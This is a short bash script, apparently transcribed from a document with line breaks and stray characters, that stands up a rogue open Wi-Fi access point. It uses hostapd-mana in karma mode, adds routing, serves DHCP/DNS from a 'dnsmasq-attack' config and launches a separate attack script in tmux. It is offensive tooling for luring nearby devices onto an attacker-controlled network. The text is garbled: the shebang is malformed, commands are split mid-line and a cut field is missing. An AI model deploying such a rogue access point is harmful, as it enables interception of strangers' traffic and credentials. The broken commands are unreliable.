#/bin/bash
                                                           [[ $# -ge 1 ]] && essid="$1" || essid='test'
                                                           OPN='wlan1'
                                                           cp /opt/hostapd-mana/hostapd/hostapd.conf /tmp/hostapd-mana.conf                                                      
sed -i "s/interface=.*/interface=$OPN/g" /tmp/hostapd-mana.conf

sed -i "s/ssid=.*/ssid=$essid/g" /tmp/hostapd-mana.conf

cp dnsmasq-attack.conf /tmp/dnsmasq-attack.conf

sed -i "s/interface=.*/interface=$OPN/g" /tmp/dnsmasq-attack.conf

sudo ifconfig $OPN up

tmux new-session -d -s karma -n OPN 'sudo /opt/hostapd-mana/hostapd/

hostapd /tmp/hostapd-mana.conf'

sudo ip a add 11.0.0.1/24 dev $OPN

sleep 1

5

table=$(ip r show table all|grep $OPN|grep '::'|head -n 1|cut -d ' '

-f )

sudo ip r add 11.0.0.0/24 dev $OPN table $table #97

sudo ip rule add to 11.0.0.0/24 lookup $table

tmux split-window -v -t OPN 'sudo dnsmasq --conf-file=/tmp/

dnsmasq-attack.conf -d'

tmux split-window -v -t OPN "./attack.sh $OPN"

tmux a -t karma
